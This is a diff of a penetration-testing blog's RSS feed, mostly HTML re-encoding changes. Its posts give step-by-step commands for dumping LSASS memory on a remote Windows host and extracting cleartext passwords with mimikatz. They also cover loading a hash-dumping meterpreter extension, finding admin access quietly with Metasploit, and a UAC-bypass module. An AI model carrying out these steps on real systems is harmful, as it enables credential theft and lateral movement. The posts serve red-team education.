@@ -16,63 +16,37 @@
       <pubDate>Fri, 07 Jun 2013 15:00:08 +0000</pubDate>
       
       <guid>https://malicious.link/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/</guid>
-      <description>&lt;p&gt;Mimikatz is now &lt;a href=&#34;https://github.com/rapid7/meterpreter/pull/9&#34;&gt;built into Metasploit&amp;rsquo;s meterpreter&lt;/a&gt;, you can do load mimikatz from the meterpreter prompt, but if you don&amp;rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&amp;rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.&lt;/p&gt;
-
+      <description>&lt;p&gt;Mimikatz is now &lt;a href=&#34;https://github.com/rapid7/meterpreter/pull/9&#34;&gt;built into Metasploit&#39;s meterpreter&lt;/a&gt;, you can do load mimikatz from the meterpreter prompt, but if you don&#39;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&#39;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.&lt;/p&gt;
 &lt;p&gt;Mimikatz Minidump: &lt;a href=&#34;http://blog.gentilkiwi.com/securite/mimikatz/minidump&#34;&gt;http://blog.gentilkiwi.com/securite/mimikatz/minidump&lt;/a&gt;&lt;/p&gt;
-
 &lt;p&gt;Procdump: &lt;a href=&#34;http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx&#34;&gt;http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx&lt;/a&gt;&lt;/p&gt;
-
 &lt;p&gt;Lets start. First we make sure our authentication works against the box and we can look inside of C$ (usually only admins can)&lt;/p&gt;
-
 &lt;pre&gt;&lt;code&gt;net use \\TARGETBOXC$ /user:DOMAIN\serviceaccount serviceaccount123
 dir \\TARGETBOX\C$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;If that works then we want to check that we can all the &amp;ldquo;AT&amp;rdquo; command on the remote host:&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If that works then we want to check that we can all the &amp;ldquo;AT&amp;rdquo; command on the remote host:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;at \\TARGETBOX
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;All set. Next lets prep our workspace on the remote host. We are using the C:\Temp directory.&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;All set. Next lets prep our workspace on the remote host. We are using the C:\Temp directory.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;mkdir \\TARGETBOX\C$\Temp
 dir \\TARGETBOX\C$\Temp
 copy c:\temp\procdump.exe \\TARGETBOXC$
 copy c:\temp\procdump.bat \\TARGETBOXC$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The contents of procdump.bat are:&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The contents of procdump.bat are:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;@echo off
 C:\temp\procdump.exe -accepteula -ma lsass.exe %COMPUTERNAME%_lsass.dmp
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I&amp;rsquo;m using the computer name in the memory dump name to help me keep track of where the dump came from, but also help me notice when I&amp;rsquo;ve dumped more than one IP that is actually the same host.&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I&#39;m using the computer name in the memory dump name to help me keep track of where the dump came from, but also help me notice when I&#39;ve dumped more than one IP that is actually the same host.&lt;/p&gt;
 &lt;p&gt;Next we schedule the task. Use net time to determine the local time for the remote machine.&lt;/p&gt;
-
 &lt;pre&gt;&lt;code&gt;net time \\TARGETBOX
 at \\TARGETBOX 13:52 C:\Temp\procdump.bat
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Pull down the file and clean up:&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Pull down the file and clean up:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;dir \\TARGETBOX\C$\Temp
 copy \\TARGETBOX\C$\Temp\*lsass.dmp C:\temp\output\
 rmdir /s \\TARGETBOX\C$\Temp
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;On your side the only thing you need to make sure is that you are running Mimikatz on a similar version and architecture you pulled from. Use the following url for reference:&lt;a href=&#34;http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png&#34;&gt;http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Load up the Alpha version of Mimikatz, switch it to minidump mode and you&amp;rsquo;re dumping creds:&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;On your side the only thing you need to make sure is that you are running Mimikatz on a similar version and architecture you pulled from. Use the following url for reference:&lt;a href=&#34;http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png&#34;&gt;http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Load up the Alpha version of Mimikatz, switch it to minidump mode and you&#39;re dumping creds:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;mimikatz # sekurlsa::minidump SUPERCOMPUTER_lsass.dmp
 Switch to MINIDUMP
 
 mimikatz # sekurlsa::logonPasswords full
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Thats it. Password dumping without ever using a &amp;ldquo;Hacker&amp;rdquo; tool on target. Much love Microsoft. And even more to Mimikatz creator &lt;a href=&#34;http://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; - Benjamin Delpy for both this alpha release and changing his licensing to allow Mimikatz code to be integrated into Meterpreter.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thats it. Password dumping without ever using a &amp;ldquo;Hacker&amp;rdquo; tool on target. Much love Microsoft. And even more to Mimikatz creator &lt;a href=&#34;http://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; - Benjamin Delpy for both this alpha release and changing his licensing to allow Mimikatz code to be integrated into Meterpreter.&lt;/p&gt;
 </description>
     </item>
     
@@ -83,63 +57,36 @@ mimikatz # sekurlsa::logonPasswords full
       
       <guid>https://malicious.link/post/2013/2013-04-08-sessiondump-meterpreter-extension/</guid>
       <description>&lt;p&gt;Mimikatz is awesome right, so is WCE. But both have one fatal flaw, even though you can execute them in memory &lt;a href=&#34;https://malicious.link/blog/2012/9/6/completely-in-memory-mimikatz-with-metasploit.html&#34;&gt;{link}&lt;/a&gt; - you still have to have the binaries, remember the command to execute it in memory, and ultimately transfer the entire binary over so that metasploit can do its thing.&lt;/p&gt;
-
 &lt;p&gt;Then along came SessionDump. I only noticed this because someone was tweeting congratulations to someone on writing it:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;No blog post or huge Vegas lights talk on it at DefCon or Blackhat. Just posted online in a corner of the Internet:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;http://www.hsc.fr/ressources/outils/sessiondump/&#34;&gt;http://www.hsc.fr/ressources/outils/sessiondump/&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Before we get started lets be clear about one thing. Sessiondump while awesome doesn&amp;rsquo;t do everything that Mimikatz does. However, it does do the feature of mimikatz that I do use the most, the logged on user hash dumping as well as the wdigest clear text password dumping. It does this as a Meterpreter extension that operates using reflective DLL injection. Does that solve our minor issues we had with mimikatz, as of right now, only partially. This code was simply posted online, not in a pull request or submitted to Metasploit in any way. So you still have to have the binary + code. What about the remembering, surely it makes it so I can just tab complete my way to passwords right? Yup, it does, but until/if it is in the Metasploit trunk you will still have to remember how to get it installed (which we will go over in a bit). The final question is yes it does still transfer a complete DLL over to the host same as any of the other extensions (not to disk mind you, just memory),.&lt;/p&gt;
-
+&lt;p&gt;Before we get started lets be clear about one thing. Sessiondump while awesome doesn&#39;t do everything that Mimikatz does. However, it does do the feature of mimikatz that I do use the most, the logged on user hash dumping as well as the wdigest clear text password dumping. It does this as a Meterpreter extension that operates using reflective DLL injection. Does that solve our minor issues we had with mimikatz, as of right now, only partially. This code was simply posted online, not in a pull request or submitted to Metasploit in any way. So you still have to have the binary + code. What about the remembering, surely it makes it so I can just tab complete my way to passwords right? Yup, it does, but until/if it is in the Metasploit trunk you will still have to remember how to get it installed (which we will go over in a bit). The final question is yes it does still transfer a complete DLL over to the host same as any of the other extensions (not to disk mind you, just memory),.&lt;/p&gt;
 &lt;p&gt;Without further ado lets go ahead and get the file and do a bunch of extracting. &lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;And finally placing everything in it&amp;rsquo;s correct place, which was nice of the author to make easy by making the archive the same as the Metasploit directory structure:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Cool, everything should be good to go. Lets use this thing. I&amp;rsquo;m using psexec to get a shell but any way you get a windows native meterpreter fine, with one caveat, and its the same as with any of the other aforementioned tools. You need to be Admin (past UAC, w/ SeDebug privilege) or NT\AUTHORITY SYSTEM.  After that it&amp;rsquo;s cake, load the extension:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And finally placing everything in it&#39;s correct place, which was nice of the author to make easy by making the archive the same as the Metasploit directory structure:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Cool, everything should be good to go. Lets use this thing. I&#39;m using psexec to get a shell but any way you get a windows native meterpreter fine, with one caveat, and its the same as with any of the other aforementioned tools. You need to be Admin (past UAC, w/ SeDebug privilege) or NT\AUTHORITY SYSTEM.  After that it&#39;s cake, load the extension:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Here is the available commands:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_7.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;And run getHashes:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_8.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_8.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;or getwDigestPasswords:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_9.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Thats is, you free passwords, YAY&amp;hellip;&lt;/p&gt;
-
 &lt;p&gt;Possible issues you may run into:&lt;/p&gt;
-
 &lt;ul&gt;
-&lt;li&gt;If you are on a x64 box and meterpreter isn&amp;rsquo;t running in a x64 process it will fail saying that it doesn&amp;rsquo;t have the correct version offsets, here is how you can check:&lt;/li&gt;
+&lt;li&gt;If you are on a x64 box and meterpreter isn&#39;t running in a x64 process it will fail saying that it doesn&#39;t have the correct version offsets, here is how you can check:&lt;/li&gt;
 &lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_10.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;x64 system and Meterpreter is x86/win32. Lets find a good process to migrate into and kick it from there. Winlogon isn&amp;rsquo;t the greatest choices since if meterpreter decides to crash it during migration then the system will go down, whereas a service running as SYSTEM will probably just restart if something fails.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_11.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_10.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;x64 system and Meterpreter is x86/win32. Lets find a good process to migrate into and kick it from there. Winlogon isn&#39;t the greatest choices since if meterpreter decides to crash it during migration then the system will go down, whereas a service running as SYSTEM will probably just restart if something fails.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_11.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;If by any chance you are running it against a system the author hasn&amp;rsquo;t gotten the offsets for. I don&amp;rsquo;t&amp;rsquo; have a screenshot for this one because he covers all the languages I have CMs for, but the author was awesome enough to include a few python scripts that can help you generate the correct offsets. I&amp;rsquo;ll show you by running it on my lsass and widgets.dll files even though he already has this data included in the CSV file that comes with session dump.&lt;/li&gt;
+&lt;li&gt;If by any chance you are running it against a system the author hasn&#39;t gotten the offsets for. I don&#39;t&amp;rsquo; have a screenshot for this one because he covers all the languages I have CMs for, but the author was awesome enough to include a few python scripts that can help you generate the correct offsets. I&#39;ll show you by running it on my lsass and widgets.dll files even though he already has this data included in the CSV file that comes with session dump.&lt;/li&gt;
 &lt;/ul&gt;
-
 &lt;p&gt;Thats all for now folks, may the shells be with you.&lt;/p&gt;
 </description>
     </item>
@@ -150,73 +97,40 @@ mimikatz # sekurlsa::logonPasswords full
       <pubDate>Wed, 31 Oct 2012 01:28:22 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-10-31-finding-admin-access/</guid>
-      <description>&lt;p&gt;You&amp;rsquo;ve got shell, and a set of credentials but you&amp;rsquo;re coming up empty on what you can do with those credentials. This is especially problematic when you can&amp;rsquo;t get past UAC as you are either in a AlwaysNotify situation or not a local admin.&lt;/p&gt;
-
-&lt;p&gt;(I&amp;rsquo;m not trying to pull some some &amp;ldquo;insert magic here&amp;rdquo; on the assumption of credentials just at the time of this writing I have only just started working (created a blank file) on a post module to do this as your current user, so until then, you need credentials)&lt;/p&gt;
-
+      <description>&lt;p&gt;You&#39;ve got shell, and a set of credentials but you&#39;re coming up empty on what you can do with those credentials. This is especially problematic when you can&#39;t get past UAC as you are either in a AlwaysNotify situation or not a local admin.&lt;/p&gt;
+&lt;p&gt;(I&#39;m not trying to pull some some &amp;ldquo;insert magic here&amp;rdquo; on the assumption of credentials just at the time of this writing I have only just started working (created a blank file) on a post module to do this as your current user, so until then, you need credentials)&lt;/p&gt;
 &lt;p&gt;Enter the auxiliary module: &lt;code&gt;auxiliary/admin/smb/check_dir_file&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;First we set up a route as aux modules don&amp;rsquo;t have a &amp;ldquo;SESSION&amp;rdquo; parameter:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;p&gt;First we set up a route as aux modules don&#39;t have a &amp;ldquo;SESSION&amp;rdquo; parameter:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Use the module and set our credentials:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Next, set ADMIN$ as we can&amp;rsquo;t guarantee C$ is the primary drive, but ADMIN$ will definitely be the WINDOWS directory. Our RHOSTS is our target range&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Next, set ADMIN$ as we can&#39;t guarantee C$ is the primary drive, but ADMIN$ will definitely be the WINDOWS directory. Our RHOSTS is our target range&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;A simple &amp;lsquo;run&amp;rsquo; and away it goes:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;So we can see that our lowly user that doesn&amp;rsquo;t have any chance of bypassing the UAC on his current system can pivot to these other systems (172.16.10.10, and 172.16.10.150) quite easily.&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;So we can see that our lowly user that doesn&#39;t have any chance of bypassing the UAC on his current system can pivot to these other systems (172.16.10.10, and 172.16.10.150) quite easily.&lt;/p&gt;
 &lt;p&gt;=============================================================================&lt;/p&gt;
-
 &lt;p&gt;The rest of this has nothing to do about admin access, just some tricks to do it better&lt;/p&gt;
-
 &lt;p&gt;=============================================================================&lt;/p&gt;
-
-&lt;p&gt;As many of you know I&amp;rsquo;m not a huge fan of sending packets I don&amp;rsquo;t need to so instead of just spraying a range (which I doubt would be seen, but why take the chance?)&lt;/p&gt;
-
+&lt;p&gt;As many of you know I&#39;m not a huge fan of sending packets I don&#39;t need to so instead of just spraying a range (which I doubt would be seen, but why take the chance?)&lt;/p&gt;
 &lt;p&gt;[&lt;strong&gt;Update&lt;/strong&gt;: While computer_browser_discovery does lookup all the hosts and sends -more- packets than check_dir_file would, those extra packets are sent at DNS resolvers not into empty space that can be detected by network sensors]&lt;/p&gt;
-
 &lt;p&gt;Enter computer_browser_discovery:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;This module does the equivalent of &amp;lsquo;net view&amp;rsquo; to get a list of computers on the domain. You can change the LTYPE to &amp;ldquo;SQL&amp;rdquo; to just get MSSQL boxes but we&amp;rsquo;re going for everything:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;As you can see WIN7X86 (the box we are on came up with 0.0.0.0) expected. and the .150 address didn&amp;rsquo;t show up at all as it&amp;rsquo;s not on the domain. So the benefits is that it&amp;rsquo;s quieter on the wire and you probably will find hosts that aren&amp;rsquo;t in your immediate IP range. (Not the case here simply because I don&amp;rsquo;t have a big enough test network). The disadvantages are as with the .150 address you may miss hosts.&lt;/p&gt;
-
-&lt;p&gt;Next we add the found host&amp;rsquo;s IP addresses to a text file (targethosts.txt)&lt;/p&gt;
-
-&lt;p&gt;[because at the time of this writing the computer_browser_discovery module doesn&amp;rsquo;t add the hosts to the MSF database]&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This module does the equivalent of &amp;lsquo;net view&amp;rsquo; to get a list of computers on the domain. You can change the LTYPE to &amp;ldquo;SQL&amp;rdquo; to just get MSSQL boxes but we&#39;re going for everything:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;As you can see WIN7X86 (the box we are on came up with 0.0.0.0) expected. and the .150 address didn&#39;t show up at all as it&#39;s not on the domain. So the benefits is that it&#39;s quieter on the wire and you probably will find hosts that aren&#39;t in your immediate IP range. (Not the case here simply because I don&#39;t have a big enough test network). The disadvantages are as with the .150 address you may miss hosts.&lt;/p&gt;
+&lt;p&gt;Next we add the found host&#39;s IP addresses to a text file (targethosts.txt)&lt;/p&gt;
+&lt;p&gt;[because at the time of this writing the computer_browser_discovery module doesn&#39;t add the hosts to the MSF database]&lt;/p&gt;
 &lt;p&gt;Then use the smb_version module which does a couple things, it verifies that the hosts are there and alive, adds them to the MSF database, and what version of Windows (or samba) they are running:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_7.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;(We still have our route set up so this is module is going through our low privilege user still)&lt;/p&gt;
-
 &lt;p&gt;And now we have info in the DB for better targeting:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_8.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Then back in our check_dir_file module we just use the hosts -R to have the database automatically set RHOSTS to the hosts in the database that match your search or alternatively use services -p 445 -R to add all the hosts that you&amp;rsquo;ve found port 445 open (everything smb_version finds will be shown in services)&lt;/p&gt;
-
-&lt;p&gt;One more way you can get hosts is doing reverse lookups of ranges. You can just hit a range you know of, or guess ranges based on the computer_browser_discovery results. You can do this with resolve_ip module (this can be pretty slow on ranges that don&amp;rsquo;t have many hosts):&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I used the range this blog is hosted on 1) because for some reason my stupid VM wasn&amp;rsquo;t resolving internal stuff 2) To demonstrate that you can use the module to resolve anything, not just internal ranges.&lt;/p&gt;
-
-&lt;p&gt;So to wrap up, we have a ton of ways to find hosts that don&amp;rsquo;t involve traditional scanning (smb_version is the only thing that comes close). And we&amp;rsquo;ve located two hosts that we have the ability to administer. One oddly enough being the domain controller, so don&amp;rsquo;t ever discount the access you already have. Tunnel vision is the pentesters worst enemy.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_8.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Then back in our check_dir_file module we just use the hosts -R to have the database automatically set RHOSTS to the hosts in the database that match your search or alternatively use services -p 445 -R to add all the hosts that you&#39;ve found port 445 open (everything smb_version finds will be shown in services)&lt;/p&gt;
+&lt;p&gt;One more way you can get hosts is doing reverse lookups of ranges. You can just hit a range you know of, or guess ranges based on the computer_browser_discovery results. You can do this with resolve_ip module (this can be pretty slow on ranges that don&#39;t have many hosts):&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_9.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I used the range this blog is hosted on 1) because for some reason my stupid VM wasn&#39;t resolving internal stuff 2) To demonstrate that you can use the module to resolve anything, not just internal ranges.&lt;/p&gt;
+&lt;p&gt;So to wrap up, we have a ton of ways to find hosts that don&#39;t involve traditional scanning (smb_version is the only thing that comes close). And we&#39;ve located two hosts that we have the ability to administer. One oddly enough being the domain controller, so don&#39;t ever discount the access you already have. Tunnel vision is the pentesters worst enemy.&lt;/p&gt;
 </description>
     </item>
     
@@ -227,44 +141,29 @@ mimikatz # sekurlsa::logonPasswords full
       
       <guid>https://malicious.link/post/2012/2012-10-30-bypassuac-got-a-facelift/</guid>
       <description>&lt;p&gt;Dave Kennedy and Kevin Mitnick submitted the &amp;ldquo;bypassuac&amp;rdquo; post module to Metasploit a while back (last DerbyCon?). Which is awesome and they did some fantastic work, but I had a few complaints as probably anyone did who used the module on a somewhat modern network.&lt;/p&gt;
-
 &lt;p&gt;&amp;ldquo;Old&amp;rdquo; module &lt;code&gt;post/windows/escalate/bypassuac&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;I decided to give it a bit of a face lift:&lt;/p&gt;
-
 &lt;p&gt;&amp;ldquo;New&amp;rdquo; local exploit module &lt;code&gt;exploit/windows/local/bypassuac&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;All of the credit for the availability of this module goes to &lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;@egyp7&lt;/a&gt; though, without his epic addition of local exploits to Metasploit the majority of the updates to this module wouldn&amp;rsquo;t be possible.&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;All of the credit for the availability of this module goes to &lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;@egyp7&lt;/a&gt; though, without his epic addition of local exploits to Metasploit the majority of the updates to this module wouldn&#39;t be possible.&lt;/p&gt;
 &lt;p&gt;Anywho, on to the new features:&lt;/p&gt;
-
-&lt;p&gt;1) You can set any windows payload you want to use now:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;ol&gt;
+&lt;li&gt;You can set any windows payload you want to use now:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;and yes it supports EXE::Custom.&lt;/p&gt;
-
-&lt;p&gt;2) It lets you know if it will be able to bypass the current setting of UAC or not:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Even when you&amp;rsquo;re going overkill with it:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;It lets you know if it will be able to bypass the current setting of UAC or not:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Even when you&#39;re going overkill with it:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;(ASK module if UAC is disabled will just elevate without any kind of user prompt)&lt;/p&gt;
-
 &lt;p&gt;And of course it works as expected if UAC needs bypassing:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;One thing I have yet to update is a simple check to make sure you are an admin that can actually bypass UAC. If you aren&amp;rsquo;t, then you&amp;rsquo;ll be leaving this lovely calling card behind for the user:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
